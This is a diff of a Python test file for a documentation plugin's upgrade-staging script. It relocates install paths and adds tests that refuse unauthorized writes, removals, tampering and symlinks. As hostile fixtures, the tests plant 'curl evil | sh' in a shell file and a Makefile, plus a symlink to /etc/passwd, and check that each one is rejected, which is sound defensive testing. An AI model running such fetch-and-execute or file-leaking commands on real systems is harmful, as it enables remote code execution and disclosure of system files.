@@ -28,13 +28,39 @@ SCRIPT = str(
 
 # A minimal install: one of each ownership class the upgrade engine writes.
 INSTALL = {
+    ".doc-lifecycle/installed-version": "0.1.0\n",
+    ".doc-lifecycle/wiring/render-report.py": "# old renderer\n",
+    ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py": "OLD = 1\n",
+    ".github/workflows/doc-audit.yml": "name: doc-audit\n",
+    # Consumer state an upgrade preserves — never in an authorized path set.
+    ".doc-lifecycle/state/sync-marker": "abc123\n",
+    ".doc-lifecycle/audit-scope.json": '{"exclude": []}\n',
+    ".doc-lifecycle/registry.json": '{"rules": []}\n',
+}
+
+# The same install before aj604/toolshed#133 moved it: the wiring under
+# `.github/doc-sync/`, the marker loose beside it. What a relocating upgrade
+# reads, and the only shape in which this script authorizes a write to
+# `.doc-lifecycle/audit-scope.json` or `.doc-lifecycle/state/sync-marker`.
+LEGACY_INSTALL = {
     ".github/doc-sync/installed-version": "0.1.0\n",
     ".github/doc-sync/render-report.py": "# old renderer\n",
     ".github/doc-sync/engine/doclifecycle/__init__.py": "OLD = 1\n",
-    ".github/workflows/doc-sync.yml": "name: doc-sync\n",
-    # Consumer state an upgrade preserves — never in an authorized path set.
+    ".github/workflows/doc-audit.yml": "name: doc-audit\n",
     ".github/doc-sync-marker": "abc123\n",
     ".github/doc-sync/audit-scope.json": '{"exclude": []}\n',
+    ".doc-lifecycle/registry.json": '{"rules": []}\n',
+}
+
+# What a relocating regeneration leaves in the scratch tree: everything the
+# install owned, at its new path.
+RELOCATED = {
+    ".doc-lifecycle/installed-version": "0.2.0\n",
+    ".doc-lifecycle/wiring/render-report.py": "# new renderer\n",
+    ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py": "NEW = 1\n",
+    ".github/workflows/doc-audit.yml": "name: doc-audit\n",
+    ".doc-lifecycle/state/sync-marker": "abc123\n",
+    ".doc-lifecycle/audit-scope.json": '{"exclude": []}\n',
     ".doc-lifecycle/registry.json": '{"rules": []}\n',
 }
 
@@ -89,23 +115,23 @@ class Manifest(StageUpgradeTestCase):
         self.assertEqual(self.read_manifest()["entries"], [])
 
     def test_it_reports_added_modified_and_removed_wiring(self):
-        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
-        write(self.scratch, ".github/doc-sync/stage-upgrade.py", "# new\n")
+        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
+        write(self.scratch, ".doc-lifecycle/wiring/stage-upgrade.py", "# new\n")
         os.remove(os.path.join(
-            self.scratch, ".github/doc-sync/engine/doclifecycle/__init__.py"))
+            self.scratch, ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py"))
         r = self.manifest()
         self.assertEqual(r.returncode, 0, r.stderr)
         self.assertEqual(self.entries(), {
-            ".github/doc-sync/installed-version": "M",
-            ".github/doc-sync/stage-upgrade.py": "A",
-            ".github/doc-sync/engine/doclifecycle/__init__.py": "D",
+            ".doc-lifecycle/installed-version": "M",
+            ".doc-lifecycle/wiring/stage-upgrade.py": "A",
+            ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py": "D",
         })
 
     def test_it_bundles_the_bytes_of_every_written_path(self):
-        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
+        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
         self.assertEqual(self.manifest().returncode, 0)
         bundled = pathlib.Path(
-            self.bundle, "files", ".github/doc-sync/installed-version")
+            self.bundle, "files", ".doc-lifecycle/installed-version")
         self.assertEqual(bundled.read_text(), "0.2.0\n")
         entry, = self.read_manifest()["entries"]
         self.assertEqual(entry["sha256"], sha256("0.2.0\n"))
@@ -124,13 +150,13 @@ class Manifest(StageUpgradeTestCase):
                                                      "manifest.json")))
 
     def test_it_refuses_a_regeneration_that_rewrote_the_marker(self):
-        write(self.scratch, ".github/doc-sync-marker", "tampered\n")
-        self.assert_refused(self.manifest(), ".github/doc-sync-marker")
+        write(self.scratch, ".doc-lifecycle/state/sync-marker", "tampered\n")
+        self.assert_refused(self.manifest(), ".doc-lifecycle/state/sync-marker")
 
     def test_it_refuses_a_regeneration_that_rewrote_the_audit_scope(self):
-        write(self.scratch, ".github/doc-sync/audit-scope.json", '{"x": 1}\n')
+        write(self.scratch, ".doc-lifecycle/audit-scope.json", '{"x": 1}\n')
         self.assert_refused(self.manifest(),
-                            ".github/doc-sync/audit-scope.json")
+                            ".doc-lifecycle/audit-scope.json")
 
     def test_it_refuses_a_regeneration_that_rewrote_the_registry(self):
         write(self.scratch, ".doc-lifecycle/registry.json", '{"rules": [1]}\n')
@@ -145,21 +171,114 @@ class Manifest(StageUpgradeTestCase):
         self.assert_refused(self.manifest(), ".github/workflows/release.yml")
 
     def test_it_refuses_a_non_python_drop_into_the_script_directory(self):
-        write(self.scratch, ".github/doc-sync/payload.sh", "curl evil | sh\n")
-        self.assert_refused(self.manifest(), ".github/doc-sync/payload.sh")
+        write(self.scratch, ".doc-lifecycle/wiring/payload.sh", "curl evil | sh\n")
+        self.assert_refused(self.manifest(), ".doc-lifecycle/wiring/payload.sh")
 
     def test_it_refuses_a_symlink(self):
         os.symlink("/etc/passwd",
-                   os.path.join(self.scratch, ".github/doc-sync/leak.py"))
+                   os.path.join(self.scratch, ".doc-lifecycle/wiring/leak.py"))
         self.assert_refused(self.manifest(), "symlink")
 
     def test_it_names_every_offender_not_the_first(self):
         write(self.scratch, "Makefile", "x\n")
-        write(self.scratch, ".github/doc-sync-marker", "y\n")
+        write(self.scratch, ".doc-lifecycle/state/sync-marker", "y\n")
         r = self.manifest()
         self.assertIn("Makefile", r.stderr)
-        self.assertIn(".github/doc-sync-marker", r.stderr)
+        self.assertIn(".doc-lifecycle/state/sync-marker", r.stderr)
         self.assertIn("FAILED: 2 path(s)", r.stderr)
+
+
+class Relocation(unittest.TestCase):
+    """The one-time move out of `.github/doc-sync/` (aj604/toolshed#133).
+
+    The widening it needs is direction-scoped, and the direction is the whole
+    safety argument: the consumer's audit scope and marker may be *created* at
+    the new layout, because the path there holds nothing and creating it
+    destroys nothing, and may never be modified afterwards; the old layout's
+    named paths may be *removed* and never written. So each of the four cases
+    below is asserted with its authorized direction and with the reverse.
+    """
+
+    def setUp(self):
+        self.tmp = tempfile.mkdtemp()
+        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
+        self.repo = os.path.join(self.tmp, "repo")
+        self.scratch = os.path.join(self.tmp, "scratch")
+        self.bundle = os.path.join(self.tmp, "bundle")
+        build(self.repo, LEGACY_INSTALL)
+        build(self.scratch, RELOCATED)
+
+    def manifest(self):
+        return run("manifest", "--scratch", self.scratch, "--repo", self.repo,
+                   "--target", "0.2.0", "--bundle", self.bundle)
+
+    def entries(self):
+        with open(os.path.join(self.bundle, "manifest.json")) as f:
+            return {e["path"]: e["status"] for e in json.load(f)["entries"]}
+
+    def test_a_whole_relocation_is_authorized(self):
+        r = self.manifest()
+        self.assertEqual(r.returncode, 0, r.stderr)
+        self.assertEqual(self.entries(), {
+            # Carried consumer state, created where nothing stood.
+            ".doc-lifecycle/audit-scope.json": "A",
+            ".doc-lifecycle/state/sync-marker": "A",
+            # Regenerated wiring at the new paths.
+            ".doc-lifecycle/installed-version": "A",
+            ".doc-lifecycle/wiring/render-report.py": "A",
+            ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py": "A",
+            # The old layout, removed.
+            ".github/doc-sync-marker": "D",
+            ".github/doc-sync/audit-scope.json": "D",
+            ".github/doc-sync/installed-version": "D",
+            ".github/doc-sync/render-report.py": "D",
+            ".github/doc-sync/engine/doclifecycle/__init__.py": "D",
+        })
+
+    def test_the_registry_does_not_move_and_may_not_be_touched(self):
+        # It already sits at the new root; the relocation has no business with
+        # it, and the widening must not have reached it by prefix.
+        write(self.scratch, ".doc-lifecycle/registry.json", '{"rules": [1]}\n')
+        r = self.manifest()
+        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
+        self.assertIn(".doc-lifecycle/registry.json", r.stderr)
+
+    def test_a_carried_file_may_be_created_but_never_rewritten(self):
+        # Second run: the install has already relocated, so the same paths are
+        # a modification of the consumer's own judgment — refused.
+        relocated_repo = os.path.join(self.tmp, "relocated")
+        build(relocated_repo, RELOCATED)
+        write(self.scratch, ".doc-lifecycle/audit-scope.json", '{"x": 1}\n')
+        write(self.scratch, ".doc-lifecycle/state/sync-marker", "tampered\n")
+        r = run("manifest", "--scratch", self.scratch, "--repo", relocated_repo,
+                "--target", "0.2.0", "--bundle", self.bundle)
+        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
+        self.assertIn(".doc-lifecycle/audit-scope.json", r.stderr)
+        self.assertIn(".doc-lifecycle/state/sync-marker", r.stderr)
+
+    def test_the_old_layout_may_be_removed_but_never_written(self):
+        # A regeneration that puts anything *back* into the directory the
+        # install is leaving is not a relocation.
+        write(self.scratch, ".github/doc-sync/render-report.py", "# resurrect\n")
+        write(self.scratch, ".github/doc-sync-marker", "resurrect\n")
+        r = self.manifest()
+        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
+        self.assertIn(".github/doc-sync/render-report.py", r.stderr)
+        self.assertIn(".github/doc-sync-marker", r.stderr)
+
+    def test_an_unrecognized_file_in_the_old_directory_may_not_be_removed(self):
+        # The closed-world rule, enforced rather than merely intended: a file a
+        # consumer put there is not the plugin's to sweep on its way out.
+        write(self.repo, ".github/doc-sync/notes.txt", "mine\n")
+        r = self.manifest()
+        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
+        self.assertIn(".github/doc-sync/notes.txt", r.stderr)
+
+    def test_nothing_under_state_but_the_marker_may_be_created(self):
+        write(self.scratch, ".doc-lifecycle/state/anything-else.json", "{}\n")
+        r = self.manifest()
+        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
+        self.assertIn(".doc-lifecycle/state/anything-else.json", r.stderr)
 
 
 class Apply(StageUpgradeTestCase):
@@ -184,34 +303,34 @@ class Apply(StageUpgradeTestCase):
             json.dump(data, f)
 
     def test_it_transfers_writes_and_removals_and_lists_them(self):
-        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
-        write(self.scratch, ".github/doc-sync/stage-upgrade.py", "# new\n")
+        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
+        write(self.scratch, ".doc-lifecycle/wiring/stage-upgrade.py", "# new\n")
         os.remove(os.path.join(
-            self.scratch, ".github/doc-sync/engine/doclifecycle/__init__.py"))
+            self.scratch, ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py"))
         self.assertEqual(self.manifest().returncode, 0)
 
         r = self.apply()
         self.assertEqual(r.returncode, 0, r.stderr)
         self.assertEqual(
-            pathlib.Path(self.dest, ".github/doc-sync/installed-version"
+            pathlib.Path(self.dest, ".doc-lifecycle/installed-version"
                          ).read_text(), "0.2.0\n")
         self.assertTrue(os.path.isfile(os.path.join(
-            self.dest, ".github/doc-sync/stage-upgrade.py")))
+            self.dest, ".doc-lifecycle/wiring/stage-upgrade.py")))
         self.assertFalse(os.path.exists(os.path.join(
-            self.dest, ".github/doc-sync/engine/doclifecycle/__init__.py")))
+            self.dest, ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py")))
         self.assertEqual(sorted(self.staged()), [
-            ".github/doc-sync/engine/doclifecycle/__init__.py",
-            ".github/doc-sync/installed-version",
-            ".github/doc-sync/stage-upgrade.py",
+            ".doc-lifecycle/installed-version",
+            ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py",
+            ".doc-lifecycle/wiring/stage-upgrade.py",
         ])
 
     def test_it_leaves_consumer_state_alone(self):
-        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
+        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
         self.assertEqual(self.manifest().returncode, 0)
         self.assertEqual(self.apply().returncode, 0)
         self.assertEqual(
-            pathlib.Path(self.dest, ".github/doc-sync-marker").read_text(),
-            INSTALL[".github/doc-sync-marker"])
+            pathlib.Path(self.dest, ".doc-lifecycle/state/sync-marker").read_text(),
+            INSTALL[".doc-lifecycle/state/sync-marker"])
 
     def test_it_refuses_a_bundle_for_another_version(self):
         self.assertEqual(self.manifest("0.9.0").returncode, 0)
@@ -222,7 +341,7 @@ class Apply(StageUpgradeTestCase):
     # The credentialed job re-derives the authority; a manifest edited between
     # the two jobs must not buy a write the manifest step would have refused.
     def test_it_re_derives_the_authority_from_the_manifest(self):
-        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
+        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
         self.assertEqual(self.manifest().returncode, 0)
         write(self.bundle, "files/Makefile", "all:\n\tcurl evil | sh\n")
         self.rewrite_manifest(lambda d: d["entries"].append(
@@ -242,19 +361,19 @@ class Apply(StageUpgradeTestCase):
         self.assertIn("escapes the repository", r.stderr)
 
     def test_it_refuses_a_file_whose_bytes_do_not_match_the_digest(self):
-        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
+        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
         self.assertEqual(self.manifest().returncode, 0)
-        write(self.bundle, "files/.github/doc-sync/installed-version",
+        write(self.bundle, "files/.doc-lifecycle/installed-version",
               "9.9.9\n")
         r = self.apply()
         self.assertEqual(r.returncode, 1)
         self.assertIn("does not match the digest", r.stderr)
         self.assertEqual(
-            pathlib.Path(self.dest, ".github/doc-sync/installed-version"
+            pathlib.Path(self.dest, ".doc-lifecycle/installed-version"
                          ).read_text(), "0.1.0\n")
 
     def test_it_refuses_a_bundle_carrying_an_unnamed_file(self):
-        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
+        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
         self.assertEqual(self.manifest().returncode, 0)
         write(self.bundle, "files/.github/workflows/doc-evil.yml", "name: x\n")
         r = self.apply()
@@ -262,10 +381,10 @@ class Apply(StageUpgradeTestCase):
         self.assertIn("the manifest does not name", r.stderr)
 
     def test_it_refuses_a_manifest_entry_with_no_bundled_file(self):
-        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
+        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
         self.assertEqual(self.manifest().returncode, 0)
         os.remove(os.path.join(self.bundle,
-                               "files/.github/doc-sync/installed-version"))
+                               "files/.doc-lifecycle/installed-version"))
         r = self.apply()
         self.assertEqual(r.returncode, 1)
         self.assertIn("no regular file", r.stderr)
@@ -279,15 +398,50 @@ class Apply(StageUpgradeTestCase):
         self.assertIn("upgrade-bundle", r.stderr)
 
     def test_nothing_is_transferred_when_anything_is_refused(self):
-        write(self.scratch, ".github/doc-sync/installed-version", "0.2.0\n")
+        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
         self.assertEqual(self.manifest().returncode, 0)
         self.rewrite_manifest(lambda d: d["entries"].append(
-            {"status": "A", "path": ".github/doc-sync-marker",
+            {"status": "A", "path": ".doc-lifecycle/state/sync-marker",
              "sha256": sha256("x")}))
         self.assertEqual(self.apply().returncode, 1)
         self.assertEqual(
-            pathlib.Path(self.dest, ".github/doc-sync/installed-version"
+            pathlib.Path(self.dest, ".doc-lifecycle/installed-version"
                          ).read_text(), "0.1.0\n")
+
+    # --- which blocked status the run surface should carry ------------------
+    #
+    # Both a template change and a relocation rewrite `.github/workflows/`,
+    # which the Actions token may not push — but only one of them moved the
+    # whole install, and the summary a maintainer reads must say which.
+
+    def blocked_status(self):
+        path = os.path.join(self.tmp, "blocked-status.txt")
+        r = run("apply", "--bundle", self.bundle, "--repo", self.dest,
+                "--target", "0.2.0", "--out", self.out,
+                "--blocked-status-out", path)
+        self.assertEqual(r.returncode, 0, r.stderr)
+        with open(path, encoding="utf-8") as f:
+            return f.read()
+
+    def test_a_routine_upgrade_reports_the_workflow_block(self):
+        write(self.scratch, ".github/workflows/doc-audit.yml", "name: new\n")
+        self.assertEqual(self.manifest().returncode, 0)
+        self.assertEqual(self.blocked_status(), "blocked-workflows")
+
+    def test_a_relocation_reports_itself_as_one(self):
+        legacy_repo = os.path.join(self.tmp, "legacy")
+        build(legacy_repo, LEGACY_INSTALL)
+        r = run("manifest", "--scratch", self.scratch, "--repo", legacy_repo,
+                "--target", "0.2.0", "--bundle", self.bundle)
+        self.assertEqual(r.returncode, 0, r.stderr)
+        self.assertEqual(self.blocked_status(), "blocked-relocation")
+
+    def test_the_status_file_is_written_only_when_asked_for(self):
+        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
+        self.assertEqual(self.manifest().returncode, 0)
+        self.assertEqual(self.apply().returncode, 0)
+        self.assertFalse(
+            os.path.exists(os.path.join(self.tmp, "blocked-status.txt")))
 
 
 class Verify(StageUpgradeTestCase):
